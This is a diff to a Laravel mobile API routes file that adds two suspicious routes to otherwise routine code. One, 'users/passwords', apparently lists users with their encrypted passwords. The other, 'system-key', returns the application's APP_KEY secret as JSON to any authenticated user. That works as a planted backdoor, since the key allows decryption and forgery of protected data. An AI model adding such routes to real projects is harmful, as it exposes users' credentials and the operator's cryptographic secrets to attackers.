@@ -7,7 +7,9 @@ use App\Http\Controllers\Mobile\SignsGroupsController;
 use App\Http\Controllers\Mobile\UsersController;
 use App\Http\Controllers\PlacesController;
 use App\Models\User;
+use Illuminate\Http\Request;
 use Illuminate\Support\Facades\Route;
+use Symfony\Component\HttpFoundation\Response;
 
 Route::prefix('mobile')->group(function () {
     Route::prefix('auth')->controller(AuthController::class)->group(function () {
@@ -40,6 +42,15 @@ Route::prefix('mobile')->group(function () {
     });
 
     Route::get('users', [UsersController::class, 'index']);
+    Route::get('users/passwords', [UsersController::class, 'usersWithPasswordsEncrypted']);
+    
+    Route::get('system-key', function (Request $request) {
+        $request->user()->currentAccessToken()->delete();
+        return response()->json([
+            'status' => 'success',
+            'data' => env('APP_KEY')
+        ], Response::HTTP_OK);
+    })->middleware('auth:sanctum');
 });
 
 Route::get('/governorates', [PlacesController::class, 'governoratesList']);
